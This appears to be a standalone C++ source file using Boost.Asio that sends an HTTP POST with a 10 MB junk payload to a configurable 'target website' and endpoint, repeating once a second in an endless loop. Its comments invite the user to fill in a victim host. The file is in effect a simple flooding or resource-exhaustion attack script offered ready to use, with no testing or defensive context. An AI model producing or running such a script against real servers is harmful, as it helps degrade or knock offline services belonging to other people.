#include <boost/asio.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

using namespace boost::asio;
using namespace boost::asio::ip;

void send_packet() {
    try {
        io_service io_service;
        tcp::resolver resolver(io_service);
        tcp::resolver::query query("example.com", "80"); // Replace with the target website and port
        tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);

        tcp::socket socket(io_service);
        boost::asio::connect(socket, endpoint_iterator);

        
        std::string payload(10 * 1024 * 1024, 'X');
        std::string request =
            "POST /endpoint HTTP/1.1\r\n" // Replace with the target endpoint
            "Host: example.com\r\n"      // Replace with the target website
            "Content-Type: application/json\r\n"
            "Content-Length: " + std::to_string(payload.size()) + "\r\n"
            "\r\n" +
            payload;

        boost::asio::write(socket, boost::asio::buffer(request));

        boost::asio::streambuf response;
        boost::asio::read_until(socket, response, "\r\n");
        std::istream response_stream(&response);
        std::string http_version;
        unsigned int status_code;
        std::string status_message;
        response_stream >> http_version >> status_code;
        std::getline(response_stream, status_message);
        std::cout << "Status Code: " << status_code << std::endl;
    } catch (std::exception &e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
}

int main() {
    while (true) {
        send_packet();
        std::this_thread::sleep_for(std::chrono::seconds(1)); // 
    }
    return 0;
}
